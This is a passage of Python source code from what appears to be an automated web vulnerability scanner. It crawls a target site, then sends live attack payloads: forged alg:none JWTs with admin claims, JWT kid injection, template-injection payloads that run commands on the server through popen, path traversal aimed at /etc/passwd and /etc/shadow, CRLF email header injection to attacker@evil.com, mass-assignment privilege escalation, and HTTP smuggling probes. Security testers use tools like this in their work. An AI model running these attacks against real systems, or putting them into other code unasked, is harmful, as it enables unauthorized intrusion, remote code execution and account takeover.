    # Default
    return f"curl -sk '{url}'"


def enrich_findings_with_poc(findings):
    """Add PoC curl commands to all findings."""
    for f in findings:
        if not f.get("poc"):
            f["poc"] = generate_poc(f)
    return findings


# ---------------------------------------------------------------------------
# Batch 21 — Playwright crawler, API fuzzing, JWT attacks, WebSocket injection
# ---------------------------------------------------------------------------

def crawl_spa(base_url, max_pages=30):
    """Crawl SPA/JS-rendered pages using Playwright — discovers routes invisible to HTTP crawlers."""
    try:
        from playwright.sync_api import sync_playwright
    except ImportError:
        return {"pages": [], "forms": [], "params": {}, "links": []}

    visited = set()
    pages = []
    forms = []
    params_found = defaultdict(set)
    links = set()

    with sync_playwright() as pw:
        browser = pw.chromium.launch(headless=True)
        ctx = browser.new_context(ignore_https_errors=True)

        # Intercept network requests to discover API endpoints
        api_calls = []

        def handle_request(request):
            url = request.url
            if any(x in url for x in ["/api/", "/graphql", "/v1/", "/v2/", "/rest/"]):
                api_calls.append({"url": url, "method": request.method,
                                  "headers": dict(request.headers)})
            # Extract query params from all requests
            parsed = urllib.parse.urlparse(url)
            if parsed.query:
                for k in urllib.parse.parse_qs(parsed.query):
                    params_found[url.split("?")[0]].add(k)

        page = ctx.new_page()
        page.on("request", handle_request)
        page.set_default_timeout(10000)

        to_visit = [base_url]
        while to_visit and len(visited) < max_pages:
            url = to_visit.pop(0)
            norm = url.split("?")[0].split("#")[0]
            if norm in visited:
                continue
            visited.add(norm)

            try:
                page.goto(url, wait_until="networkidle", timeout=12000)
                time.sleep(0.5)  # Let JS render

                # Get all links from rendered DOM
                hrefs = page.evaluate("""() => {
                    return [...document.querySelectorAll('a[href], [data-href], [routerLink]')]
                        .map(el => el.href || el.getAttribute('data-href') || el.getAttribute('routerLink'))
                        .filter(h => h && h.startsWith('http'));
                }""")
                for href in (hrefs or []):
                    parsed = urllib.parse.urlparse(href)
                    base_parsed = urllib.parse.urlparse(base_url)
                    if parsed.netloc == base_parsed.netloc:
                        links.add(href)
                        if href.split("?")[0] not in visited:
                            to_visit.append(href)

                # Extract forms from rendered DOM
                dom_forms = page.evaluate("""() => {
                    return [...document.querySelectorAll('form')].map(f => ({
                        action: f.action,
                        method: f.method || 'GET',
                        inputs: [...f.querySelectorAll('input,textarea,select')].map(i => ({
                            name: i.name, type: i.type || 'text', value: i.value || ''
                        })).filter(i => i.name)
                    }));
                }""")
                for f in (dom_forms or []):
                    forms.append({"url": url, "action": f["action"], "method": f["method"].upper(),
                                  "inputs": f["inputs"]})

                # Click buttons to trigger dynamic content
                buttons = page.query_selector_all("button, [role='button'], .btn")
                for btn in (buttons or [])[:3]:
                    try:
                        btn.click(timeout=2000)
                        time.sleep(0.3)
                    except Exception:
                        pass

                pages.append({"url": url, "status": 200, "length": len(page.content())})
            except Exception:
                continue

        browser.close()

    # Merge API calls into params
    for call in api_calls:
        url = call["url"].split("?")[0]
        parsed = urllib.parse.urlparse(call["url"])
        if parsed.query:
            for k in urllib.parse.parse_qs(parsed.query):
                params_found[url].add(k)
        links.add(call["url"])

    return {
        "pages": pages,
        "forms": forms,
        "params": {u: list(p) for u, p in params_found.items()},
        "links": list(links),
        "api_calls": api_calls,
    }


def scan_openapi_fuzz(base_url, crawl_data):
    """Auto-fuzz every field in discovered OpenAPI/Swagger specs with type-aware payloads."""
    findings = []
    spec = None

    # Try to find OpenAPI spec
    spec_paths = ["/openapi.json", "/swagger.json", "/api-docs", "/v1/openapi.json",
                  "/v2/swagger.json", "/api/swagger.json", "/docs/openapi.json"]
    for path in spec_paths:
        try:
            r = _S.get(f"{base_url.rstrip('/')}{path}", timeout=_TIMEOUT_SHORT)
            if r.status_code == 200 and "paths" in r.text:
                spec = r.json()
                break
        except Exception:
            continue

    if not spec or "paths" not in spec:
        return findings

    # Type-aware fuzz payloads
    type_payloads = {
        "string": ["' OR '1'='1", "<script>alert(1)</script>", "{{7*7}}", "../../../etc/passwd",
                   "admin@evil.com", "A" * 5000, "${7*7}", "null", "undefined"],
        "integer": [0, -1, 99999999, 2147483647, -2147483648, "1 OR 1=1"],
        "number": [0.0, -1.0, 99999999.99, "NaN", "Infinity"],
        "boolean": ["true", "false", "null", "1", "0", "yes"],
        "array": [[], [None], ["'OR 1=1--"], list(range(1000))],
        "object": [{"__proto__": {"admin": True}}, {"constructor": {"prototype": {"admin": True}}}],
    }

    base = base_url.rstrip("/")
    servers = spec.get("servers", [{"url": base}])
    server_url = servers[0].get("url", base) if servers else base
    if server_url.startswith("/"):
        server_url = base + server_url

    for path, methods in spec.get("paths", {}).items():
        for method, details in methods.items():
            if method.lower() not in ("get", "post", "put", "patch", "delete"):
                continue

            endpoint = f"{server_url}{path}"
            params = details.get("parameters", [])
            request_body = details.get("requestBody", {})

            # Fuzz query/path parameters
            for param in params:
                pname = param.get("name", "")
                ptype = param.get("schema", {}).get("type", "string")
                payloads = type_payloads.get(ptype, type_payloads["string"])

                for payload in payloads[:3]:
                    test_url = endpoint.replace(f"{{{pname}}}", str(payload))
                    if param.get("in") == "query":
                        test_url = f"{endpoint}?{pname}={urllib.parse.quote_plus(str(payload))}"
                    try:
                        r = _S.request(method.upper(), test_url, timeout=_TIMEOUT)
                        # Check for errors indicating injection
                        if r.status_code == 500:
                            findings.append({
                                "type": f"API Fuzzing: Server Error on {pname}",
                                "severity": "medium",
                                "url": test_url,
                                "detail": f"500 error with payload type={ptype}: {str(payload)[:50]}",
                                "template": "apex-api-fuzz",
                            })
                        elif any(x in r.text.lower() for x in ["sql", "syntax", "exception", "traceback", "stack"]):
                            findings.append({
                                "type": f"API Injection via {pname}",
                                "severity": "high",
                                "url": test_url,
                                "detail": f"Error disclosure with {ptype} payload on param '{pname}'",
                                "template": "apex-api-fuzz-inject",
                            })
                            break
                    except Exception:
                        continue

            # Fuzz request body
            if request_body:
                content = request_body.get("content", {})
                json_schema = content.get("application/json", {}).get("schema", {})
                properties = json_schema.get("properties", {})
                if properties:
                    for field, field_schema in properties.items():
                        ftype = field_schema.get("type", "string")
                        payloads = type_payloads.get(ftype, type_payloads["string"])
                        for payload in payloads[:2]:
                            body = {field: payload}
                            try:
                                r = _S.request(method.upper(), endpoint, json=body, timeout=_TIMEOUT)
                                if r.status_code == 500 or any(x in r.text.lower() for x in ["exception", "traceback", "error"]):
                                    findings.append({
                                        "type": f"API Body Injection: {field}",
                                        "severity": "high" if "sql" in r.text.lower() else "medium",
                                        "url": endpoint,
                                        "detail": f"Field '{field}' (type={ftype}) causes error with: {str(payload)[:40]}",
                                        "template": "apex-api-fuzz-body",
                                    })
                                    break
                            except Exception:
                                continue
    return findings


def scan_jwt_full_attack(crawl_data, web_targets):
    """Full JWT attack suite: alg:none, HS256/RS256 confusion, kid injection, jku spoofing."""
    import base64 as b64
    findings = []

    # Find JWT tokens in responses
    jwt_pattern = re.compile(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*')
    tokens_found = []

    for page in crawl_data.get("pages", [])[:10]:
        url = page["url"]
        try:
            r = _S.get(url, timeout=_TIMEOUT_SHORT)
            for token in jwt_pattern.findall(r.text):
                tokens_found.append((url, token))
            # Check cookies
            for cookie in r.cookies:
                if jwt_pattern.match(cookie.value):
                    tokens_found.append((url, cookie.value))
            # Check headers
            auth = r.headers.get("Authorization", "")
            if jwt_pattern.search(auth):
                tokens_found.append((url, jwt_pattern.search(auth).group()))
        except Exception:
            continue

    if not tokens_found:
        return findings

    for source_url, token in tokens_found[:3]:
        parts = token.split(".")
        if len(parts) < 2:
            continue

        try:
            # Decode header and payload
            header = json.loads(b64.urlsafe_b64decode(parts[0] + "=="))
            payload = json.loads(b64.urlsafe_b64decode(parts[1] + "=="))
        except Exception:
            continue

        base = "/".join(source_url.split("/", 3)[:3])

        # Attack 1: alg:none
        none_header = b64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).rstrip(b"=").decode()
        # Elevate privileges in payload
        evil_payload = dict(payload)
        for key in ["role", "admin", "is_admin", "permissions", "scope"]:
            if key in evil_payload:
                evil_payload[key] = "admin" if key == "role" else True
        if "sub" in evil_payload:
            evil_payload["sub"] = "1"  # Try user ID 1
        evil_payload_b64 = b64.urlsafe_b64encode(json.dumps(evil_payload).encode()).rstrip(b"=").decode()
        none_token = f"{none_header}.{evil_payload_b64}."

        # Test the none token against API endpoints
        for path in ["/api/me", "/api/user", "/api/profile", "/api/admin", "/user/info"]:
            ep = f"{base}{path}"
            try:
                r = _S.get(ep, headers={"Authorization": f"Bearer {none_token}"}, timeout=_TIMEOUT_SHORT)
                if r.status_code == 200 and len(r.text) > 50:
                    if "error" not in r.text.lower() and "invalid" not in r.text.lower():
                        findings.append({
                            "type": "JWT Algorithm None Bypass",
                            "severity": "critical",
                            "url": ep,
                            "detail": f"Server accepts JWT with alg:none — full auth bypass. Token: {none_token[:60]}...",
                            "template": "apex-jwt-none",
                        })
                        break
            except Exception:
                continue

        # Attack 2: kid injection (SQL injection via kid header)
        for kid_payload in ["' UNION SELECT 'secret'--", "../../dev/null", "/dev/null", "| cat /etc/passwd"]:
            kid_header = b64.urlsafe_b64encode(json.dumps({
                "alg": header.get("alg", "HS256"), "typ": "JWT", "kid": kid_payload
            }).encode()).rstrip(b"=").decode()
            kid_token = f"{kid_header}.{parts[1]}.{parts[2] if len(parts) > 2 else ''}"
            for path in ["/api/me", "/api/user", "/api/profile"]:
                ep = f"{base}{path}"
                try:
                    r = _S.get(ep, headers={"Authorization": f"Bearer {kid_token}"}, timeout=_TIMEOUT_SHORT)
                    if r.status_code == 200 and "error" not in r.text.lower()[:100]:
                        findings.append({
                            "type": "JWT kid Header Injection",
                            "severity": "critical",
                            "url": ep,
                            "detail": f"kid injection accepted: {kid_payload}. Possible SQLi/path traversal in key lookup.",
                            "template": "apex-jwt-kid-inject",
                        })
                        break
                except Exception:
                    continue

        # Attack 3: HS256/RS256 confusion (if original is RS256, try HS256 with public key)
        if header.get("alg") in ("RS256", "RS384", "RS512"):
            findings.append({
                "type": "JWT RS256 → HS256 Confusion Possible",
                "severity": "medium",
                "url": source_url,
                "detail": f"JWT uses {header['alg']}. If public key is known, HS256 confusion attack may bypass signature verification.",
                "template": "apex-jwt-confusion",
            })

    return findings


def scan_websocket_inject(web_targets):
    """WebSocket injection — connect to WS endpoints and inject payloads."""
    findings = []
    try:
        import websocket as ws
    except ImportError:
        # Try with raw sockets
        return findings

    ws_paths = ["/ws", "/websocket", "/socket.io/?EIO=4&transport=websocket",
                "/cable", "/hub", "/realtime", "/live", "/stream"]

    for target in web_targets[:5]:
        parsed = urllib.parse.urlparse(target)
        ws_base = f"wss://{parsed.netloc}" if parsed.scheme == "https" else f"ws://{parsed.netloc}"

        for path in ws_paths:
            ws_url = f"{ws_base}{path}"
            try:
                conn = ws.create_connection(ws_url, timeout=5,
                                            sslopt={"cert_reqs": 0},
                                            header=["Origin: https://evil.com"])
                # Test 1: Origin bypass — connected from evil.com
                findings.append({
                    "type": "WebSocket Origin Bypass",
                    "severity": "medium",
                    "url": ws_url,
                    "detail": "WebSocket accepts connections from arbitrary origins (Origin: https://evil.com)",
                    "template": "apex-ws-origin",
                })

                # Test 2: Inject XSS payload
                xss_payload = '{"message":"<img src=x onerror=alert(1)>","type":"chat"}'
                conn.send(xss_payload)
                try:
                    resp = conn.recv()
                    if "onerror" in resp or "<img" in resp:
                        findings.append({
                            "type": "WebSocket XSS Injection",
                            "severity": "high",
                            "url": ws_url,
                            "detail": f"XSS payload reflected via WebSocket: {resp[:80]}",
                            "template": "apex-ws-xss",
                        })
                except Exception:
                    pass

                # Test 3: SQLi via WebSocket
                sqli_payload = '{"id":"1\' OR \'1\'=\'1","action":"get"}'
                conn.send(sqli_payload)
                try:
                    resp = conn.recv()
                    if any(x in resp.lower() for x in ["sql", "syntax", "error", "mysql"]):
                        findings.append({
                            "type": "WebSocket SQL Injection",
                            "severity": "critical",
                            "url": ws_url,
                            "detail": f"SQL error via WebSocket: {resp[:100]}",
                            "template": "apex-ws-sqli",
                        })
                except Exception:
                    pass

                conn.close()
                break  # Found a working WS endpoint
            except Exception:
                continue
    return findings


def scan_email_header_inject(crawl_data):
    """Email header injection — inject CC/BCC headers via contact/registration forms."""
    findings = []
    email_payloads = [
        "victim@test.com%0ACc:attacker@evil.com",
        "victim@test.com\r\nBcc:attacker@evil.com",
        "victim@test.com%0D%0ASubject:Hacked",
    ]

    for form in crawl_data.get("forms", [])[:10]:
        action = form.get("action", "")
        if not action:
            continue
        inputs = form.get("inputs", [])
        email_fields = [i for i in inputs if i.get("type") == "email" or
                        any(x in i.get("name", "").lower() for x in ["email", "mail", "to", "from"])]
        if not email_fields:
            continue

        for email_field in email_fields:
            for payload in email_payloads:
                data = {i.get("name", "f"): i.get("value", "test") for i in inputs}
                data[email_field["name"]] = payload
                try:
                    r = _S.post(action, data=data, timeout=_TIMEOUT)
                    # If server doesn't reject the CRLF injection
                    if r.status_code in (200, 201, 302):
                        if "error" not in r.text.lower()[:200] and "invalid" not in r.text.lower()[:200]:
                            findings.append({
                                "type": "Email Header Injection",
                                "severity": "high",
                                "url": action,
                                "detail": f"Field '{email_field['name']}' accepts CRLF — can inject CC/BCC to send spam or phish",
                                "template": "apex-email-inject",
                            })
                            break
                except Exception:
                    continue
    return findings


# ---------------------------------------------------------------------------
# Batch 22 — Subdomain takeover fingerprints, GraphQL enum, cookie attacks
# ---------------------------------------------------------------------------

# Extended subdomain takeover fingerprints (service → error text)
_TAKEOVER_FINGERPRINTS = {
    "GitHub Pages": ["There isn't a GitHub Pages site here", "For root URLs (like http://example.com/)"],
    "Heroku": ["No such app", "herokucdn.com/error-pages", "no-such-app"],
    "AWS S3": ["NoSuchBucket", "The specified bucket does not exist"],
    "Shopify": ["Sorry, this shop is currently unavailable", "Only one step left"],
    "Tumblr": ["There's nothing here.", "Whatever you were looking for doesn't currently exist"],
    "WordPress.com": ["Do you want to register"],
    "Pantheon": ["The gods are wise", "404 error unknown site"],
    "Fastly": ["Fastly error: unknown domain"],
    "Ghost": ["The thing you were looking for is no longer here"],
    "Surge.sh": ["project not found"],
    "Bitbucket": ["Repository not found"],
    "Zendesk": ["Help Center Closed", "this help center no longer exists"],
    "TeamWork": ["Oops - We didn't find your site"],
    "Helpjuice": ["We could not find what you're looking for"],
    "HelpScout": ["No settings were found for this company"],
    "Cargo": ["If you're moving your domain away from Cargo"],
    "Statuspage": ["You are being redirected", "statuspage.io"],
    "UserVoice": ["This UserVoice subdomain is currently available"],
    "Smugmug": ["SmugMug", "Page Not Found"],
    "Strikingly": ["But if you're looking to build your own website"],
    "Uptimerobot": ["page not found"],
    "Intercom": ["This page is reserved for artistic dogs", "Uh oh. That page doesn't exist"],
    "Webflow": ["The page you are looking for doesn't exist or has been moved"],
    "Kajabi": ["The page you were looking for doesn't exist"],
    "Thinkific": ["You may have mistyped the address or the page may have moved"],
    "Tilda": ["Please renew your subscription"],
    "Fly.io": ["404 Not Found", "fly.io"],
    "Netlify": ["Not Found - Request ID"],
    "Vercel": ["The deployment could not be found", "DEPLOYMENT_NOT_FOUND"],
    "Azure": ["404 Web Site not found", "The resource you are looking for has been removed"],
    "Google Cloud": ["The requested URL was not found on this server", "404. That's an error"],
    "Readme.io": ["Project doesnt exist"],
    "Canny": ["Company Not Found", "There is no such company"],
    "Tictail": ["to target URL: <a href=\"https://tictail.com"],
    "Agile CRM": ["Sorry, this page is no longer available"],
    "Aha!": ["There is no portal here"],
    "Airee.ru": ["Ошибка 402. Pair not found"],
    "Anima": ["If this is your website and you've just created it"],
    "Announcekit": ["Error 404", "announcekit"],
    "LaunchRock": ["It looks like you may have taken a wrong turn somewhere"],
}


def scan_subdomain_takeover_v2(subdomains, web_targets):
    """Enhanced subdomain takeover with 40+ service fingerprints and DNS verification."""
    findings = []
    import socket

    # Build URLs to check
    check_urls = []
    for sub in subdomains:
        check_urls.append(f"https://{sub}")
        check_urls.append(f"http://{sub}")

    for url, r in batch_get(check_urls, timeout=8):
        if r is None:
            # Connection failed — check if DNS resolves
            host = urllib.parse.urlparse(url).hostname
            try:
                socket.gethostbyname(host)
                # DNS resolves but no HTTP — could be dangling
            except socket.gaierror:
                # NXDOMAIN — check CNAME
                try:
                    import subprocess
                    result = subprocess.run(["dig", "+short", "CNAME", host],
                                           capture_output=True, text=True, timeout=5)
                    cname = result.stdout.strip()
                    if cname:
                        findings.append({
                            "type": "Subdomain Takeover (Dangling CNAME)",
                            "severity": "critical",
                            "url": url,
                            "detail": f"NXDOMAIN with CNAME → {cname}. Claim this on the service provider.",
                            "template": "apex-takeover-deep",
                        })
                except Exception:
                    pass
            continue

        # Check response against all fingerprints
        body = r.text[:5000]
        for service, fingerprints in _TAKEOVER_FINGERPRINTS.items():
            if any(fp in body for fp in fingerprints):
                findings.append({
                    "type": f"Subdomain Takeover ({service})",
                    "severity": "critical",
                    "url": url,
                    "detail": f"Service: {service}. Register/claim this subdomain on {service} to take over.",
                    "template": "apex-takeover-deep",
                })
                break
    return findings


def scan_graphql_field_suggest(crawl_data):
    """GraphQL introspection-free enumeration via field suggestion errors."""
    findings = []
    tested = set()

    for page in crawl_data.get("pages", [])[:5]:
        base = "/".join(page["url"].split("/", 3)[:3])
        if base in tested:
            continue
        tested.add(base)

        for path in ["/graphql", "/api/graphql", "/gql", "/query"]:
            url = f"{base}{path}"
            try:
                # First check if GraphQL is there
                r = _S.post(url, json={"query": "{ __typename }"}, timeout=_TIMEOUT_SHORT)
                if r.status_code != 200:
                    continue

                # Try invalid field names — GraphQL suggests valid ones
                probe_fields = ["usrs", "usr", "admi", "passwor", "secre", "toke",
                                "accoun", "profil", "orde", "paymen", "credi",
                                "transactio", "balanc", "permissio", "rol"]
                discovered_fields = set()

                for probe in probe_fields:
                    query = {"query": f"{{ {probe} }}"}
                    r2 = _S.post(url, json=query, timeout=_TIMEOUT_SHORT)
                    if r2.status_code == 200:
                        try:
                            data = r2.json()
                            errors = data.get("errors", [])
                            for err in errors:
                                msg = err.get("message", "")
                                # Extract suggestions like "Did you mean 'users'?"
                                suggestions = re.findall(r"['\"](\w+)['\"]", msg)
                                for s in suggestions:
                                    if s not in ("query", "mutation", "subscription", probe):
                                        discovered_fields.add(s)
                        except Exception:
                            pass

                if discovered_fields:
                    # Try to query discovered fields
                    sensitive = [f for f in discovered_fields
                                 if any(x in f.lower() for x in ["user", "admin", "password",
                                                                   "secret", "token", "payment",
                                                                   "credit", "balance", "order"])]
                    findings.append({
                        "type": "GraphQL Field Enumeration (No Introspection)",
                        "severity": "high" if sensitive else "medium",
                        "url": url,
                        "detail": f"Discovered {len(discovered_fields)} fields via suggestions: {', '.join(list(discovered_fields)[:10])}. Sensitive: {', '.join(sensitive[:5])}",
                        "template": "apex-graphql-field-enum",
                    })
                    break
            except Exception:
                continue
    return findings


def scan_cookie_tossing(crawl_data, web_targets):
    """Cookie tossing and session fixation attacks."""
    findings = []

    for target in web_targets[:8]:
        try:
            r = _S.get(target, timeout=_TIMEOUT)
            cookies = r.cookies

            for cookie in cookies:
                # Check for session fixation — can we set the session cookie?
                if any(x in cookie.name.lower() for x in ["session", "sess", "sid", "token", "auth"]):
                    # Test 1: Is the cookie accepted if we send it pre-set?
                    fixed_value = "apex_fixation_test_" + str(int(time.time()))
                    r2 = _S.get(target, cookies={cookie.name: fixed_value}, timeout=_TIMEOUT)
                    # If server accepts our cookie without regenerating
                    for c in r2.cookies:
                        if c.name == cookie.name and c.value == fixed_value:
                            findings.append({
                                "type": "Session Fixation",
                                "severity": "high",
                                "url": target,
                                "detail": f"Cookie '{cookie.name}' accepts attacker-set value without regeneration",
                                "template": "apex-session-fixation",
                            })
                            break

                # Check for missing Secure/HttpOnly flags on session cookies
                if any(x in cookie.name.lower() for x in ["session", "token", "auth", "jwt"]):
                    issues = []
                    if not cookie.secure:
                        issues.append("missing Secure flag")
                    if "httponly" not in str(cookie._rest).lower():
                        issues.append("missing HttpOnly flag")
                    if cookie.domain and cookie.domain.startswith("."):
                        # Cookie set on parent domain — cookie tossing possible
                        issues.append(f"set on parent domain {cookie.domain} (cookie tossing)")
                    if issues and "tossing" in " ".join(issues):
                        findings.append({
                            "type": "Cookie Tossing Possible",
                            "severity": "high",
                            "url": target,
                            "detail": f"Cookie '{cookie.name}': {', '.join(issues)}. Subdomain can overwrite this cookie.",
                            "template": "apex-cookie-toss",
                        })
        except Exception:
            continue
    return findings


# ---------------------------------------------------------------------------
# Batch 23 — Smart SSTI, IDOR automation, path traversal with encoding bypass
# ---------------------------------------------------------------------------

def scan_ssti_smart(crawl_data):
    """Smart SSTI detection — identifies template engine and attempts RCE."""
    findings = []
    # Polyglot that triggers on multiple engines
    polyglot = "${7*7}{{7*7}}<%=7*7%>#{7*7}{7*7}"
    # Engine-specific payloads with expected output
    engine_payloads = [
        ("Jinja2/Twig", "{{7*7}}", "49"),
        ("Jinja2/Twig", "{{7*'7'}}", "7777777"),
        ("Mako", "${7*7}", "49"),
        ("ERB", "<%=7*7%>", "49"),
        ("Smarty", "{7*7}", "49"),
        ("Freemarker", "${7*7}", "49"),
        ("Velocity", "#set($x=7*7)${x}", "49"),
        ("Pebble", "{{7*7}}", "49"),
        ("Thymeleaf", "[[${7*7}]]", "49"),
    ]
    # RCE payloads per engine
    rce_payloads = {
        "Jinja2/Twig": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        "Mako": "${__import__('os').popen('id').read()}",
        "ERB": "<%=`id`%>",
        "Freemarker": "${'freemarker.template.utility.Execute'?new()('id')}",
    }

    for url, params in list(crawl_data.get("params", {}).items())[:20]:
        for p in params[:3]:
            # First test with polyglot
            parsed = urllib.parse.urlparse(url)
            qs = urllib.parse.parse_qs(parsed.query)
            qs[p] = [polyglot]
            test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
            try:
                r = _S.get(test_url, timeout=_TIMEOUT)
                if "49" not in r.text:
                    continue
                # Polyglot triggered — identify which engine
                for engine, payload, expected in engine_payloads:
                    qs[p] = [payload]
                    eng_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                    r2 = _S.get(eng_url, timeout=_TIMEOUT)
                    if expected in r2.text and payload not in r2.text:
                        # Confirmed SSTI — try RCE
                        severity = "critical"
                        detail = f"SSTI confirmed ({engine}) via param '{p}': {payload} → {expected}"
                        if engine in rce_payloads:
                            qs[p] = [rce_payloads[engine]]
                            rce_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                            r3 = _S.get(rce_url, timeout=_TIMEOUT)
                            if any(x in r3.text for x in ["uid=", "root", "www-data"]):
                                detail += f" → RCE CONFIRMED: {r3.text[:100]}"
                        findings.append({
                            "type": f"SSTI → RCE ({engine})",
                            "severity": severity,
                            "url": eng_url,
                            "detail": detail,
                            "template": "apex-ssti-rce",
                        })
                        break
            except Exception:
                continue
    return findings


def scan_idor_auto(crawl_data):
    """Automated IDOR detection — finds sequential/predictable IDs and tests access."""
    findings = []
    id_patterns = re.compile(r'[?&/](id|user_id|account_id|order_id|doc_id|file_id|item_id|profile_id|invoice_id)=(\d+)', re.IGNORECASE)

    for url in list(crawl_data.get("params", {}).keys())[:30]:
        matches = id_patterns.findall(url)
        if not matches:
            continue

        for param_name, current_id in matches:
            current_id = int(current_id)
            # Try adjacent IDs
            test_ids = [current_id - 1, current_id + 1, 1, 0, current_id + 100]

            try:
                # Get baseline response for current ID
                r_base = _S.get(url, timeout=_TIMEOUT)
                if r_base.status_code != 200:
                    continue
                base_len = len(r_base.text)

                for test_id in test_ids:
                    test_url = re.sub(
                        f'([?&/]){param_name}={current_id}',
                        f'\\g<1>{param_name}={test_id}',
                        url
                    )
                    r_test = _S.get(test_url, timeout=_TIMEOUT)
                    if r_test.status_code == 200 and len(r_test.text) > 50:
                        # Different content = different user's data
                        if r_test.text != r_base.text and abs(len(r_test.text) - base_len) < base_len * 2:
                            # Check for sensitive data indicators
                            if any(x in r_test.text.lower() for x in ["email", "name", "phone",
                                                                        "address", "balance", "order"]):
                                findings.append({
                                    "type": f"IDOR via {param_name}",
                                    "severity": "high",
                                    "url": test_url,
                                    "detail": f"Accessing {param_name}={test_id} returns different user data (original: {current_id})",
                                    "template": "apex-idor-auto",
                                })
                                break
            except Exception:
                continue
    return findings


def scan_path_traversal_bypass(crawl_data):
    """Path traversal with encoding bypass — double encoding, null bytes, unicode."""
    findings = []
    # Payloads with various bypass techniques
    traversal_payloads = [
        ("../../../etc/passwd", "root:"),
        ("....//....//....//etc/passwd", "root:"),
        ("..%252f..%252f..%252fetc/passwd", "root:"),  # double URL encode
        ("..%c0%af..%c0%af..%c0%afetc/passwd", "root:"),  # unicode
        ("..\\..\\..\\etc\\passwd", "root:"),  # backslash
        ("/etc/passwd%00.jpg", "root:"),  # null byte
        ("....//....//....//etc/shadow", "root:"),
        ("..%2f..%2f..%2fetc/passwd", "root:"),
        ("/proc/self/environ", "PATH="),
        ("/proc/self/cmdline", "python"),
        ("....//....//....//windows/win.ini", "[fonts]"),
        ("..%5c..%5c..%5cwindows/win.ini", "[fonts]"),
    ]

    file_params = ["file", "path", "page", "template", "include", "doc",
                   "document", "folder", "root", "pg", "style", "pdf",
                   "img", "image", "filename", "attachment", "download"]

    for url, params in list(crawl_data.get("params", {}).items())[:20]:
        for p in params:
            if not any(x in p.lower() for x in file_params):
                continue
            for payload, indicator in traversal_payloads:
                parsed = urllib.parse.urlparse(url)
                qs = urllib.parse.parse_qs(parsed.query)
                qs[p] = [payload]
                test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                try:
                    r = _S.get(test_url, timeout=_TIMEOUT)
                    if indicator in r.text and r.status_code == 200:
                        findings.append({
                            "type": "Path Traversal (Encoding Bypass)",
                            "severity": "critical",
                            "url": test_url,
                            "detail": f"LFI via param '{p}' with bypass payload: {payload[:40]}",
                            "template": "apex-lfi-bypass",
                        })
                        break
                except Exception:
                    continue
    return findings


# ---------------------------------------------------------------------------
# Batch 24 — HTTP smuggling detection, privilege escalation, mass assignment
# ---------------------------------------------------------------------------

def scan_http_smuggling_detect(web_targets):
    """HTTP request smuggling detection — CL.TE and TE.CL with timing differential."""
    findings = []

    for target in web_targets[:5]:
        # CL.TE detection: send ambiguous request, measure timing
        try:
            # Normal request baseline
            import socket, ssl
            parsed = urllib.parse.urlparse(target)
            host = parsed.hostname
            port = 443 if parsed.scheme == "https" else 80

            # CL.TE probe: Content-Length says body is short, Transfer-Encoding says chunked
            probe = (
                f"POST / HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: 4\r\n"
                f"Transfer-Encoding: chunked\r\n"
                f"\r\n"
                f"1\r\n"
                f"Z\r\n"
                f"Q\r\n"  # This should cause a timeout if TE is used
            )

            sock = socket.create_connection((host, port), timeout=5)
            if port == 443:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                sock = ctx.wrap_socket(sock, server_hostname=host)

            t0 = time.time()
            sock.sendall(probe.encode())
            try:
                sock.settimeout(5)
                resp = sock.recv(4096)
                elapsed = time.time() - t0
            except socket.timeout:
                elapsed = time.time() - t0
                resp = b""
            sock.close()

            # If response took >3s, server is likely using TE (waiting for chunk end)
            if elapsed > 3.0:
                findings.append({
                    "type": "HTTP Request Smuggling (CL.TE)",
                    "severity": "critical",
                    "url": target,
                    "detail": f"Server delayed {elapsed:.1f}s on CL.TE probe — likely vulnerable to request smuggling",
                    "template": "apex-smuggling-clte",
                })
        except Exception:
            continue
    return findings


def scan_privilege_escalation(crawl_data, web_targets):
    """Privilege escalation via parameter manipulation — add admin/role params to requests."""
    findings = []
    priv_params = {
        "role": ["admin", "administrator", "superuser", "root"],
        "is_admin": ["true", "1", "yes"],
        "admin": ["true", "1"],
        "access_level": ["admin", "9", "99"],
        "user_type": ["admin", "staff", "internal"],
        "permissions": ["all", "admin", "*"],
        "group": ["admin", "administrators"],
        "privilege": ["admin", "elevated"],
    }

    for target in web_targets[:5]:
        base = target.rstrip("/")
        # Test on API endpoints
        for path in ["/api/user", "/api/me", "/api/profile", "/api/account", "/user/settings"]:
            url = f"{base}{path}"
            try:
                r_base = _S.get(url, timeout=_TIMEOUT_SHORT)
                if r_base.status_code != 200:
                    continue

                for param, values in priv_params.items():
                    for val in values:
                        # Try as query param
                        test_url = f"{url}?{param}={val}"
                        r = _S.get(test_url, timeout=_TIMEOUT_SHORT)
                        if r.status_code == 200 and len(r.text) != len(r_base.text):
                            if any(x in r.text.lower() for x in ["admin", "elevated", "all_permissions",
                                                                    "superuser", "staff"]):
                                findings.append({
                                    "type": f"Privilege Escalation via {param}={val}",
                                    "severity": "critical",
                                    "url": test_url,
                                    "detail": f"Adding {param}={val} changes response — possible role escalation",
                                    "template": "apex-privesc",
                                })
                                break

                        # Try as JSON body
                        r2 = _S.post(url, json={param: val}, timeout=_TIMEOUT_SHORT)
                        if r2.status_code in (200, 201) and "error" not in r2.text.lower()[:100]:
                            if any(x in r2.text.lower() for x in ["admin", "updated", "success"]):
                                findings.append({
                                    "type": f"Mass Assignment → Privilege Escalation ({param})",
                                    "severity": "critical",
                                    "url": url,
                                    "detail": f"POST with {param}={val} accepted — mass assignment to admin role",
                                    "template": "apex-mass-assign-privesc",
                                })
                                break
            except Exception:
                continue
    return findings


def scan_api_versioning_bypass(crawl_data, web_targets):
    """API version bypass — access deprecated/unprotected older API versions."""
    findings = []
    version_patterns = [
        ("/api/v2/", ["/api/v1/", "/api/v0/", "/api/"]),
        ("/api/v3/", ["/api/v2/", "/api/v1/"]),
        ("/v2/", ["/v1/", "/v0/"]),
        ("/v3/", ["/v2/", "/v1/"]),
    ]

    tested = set()
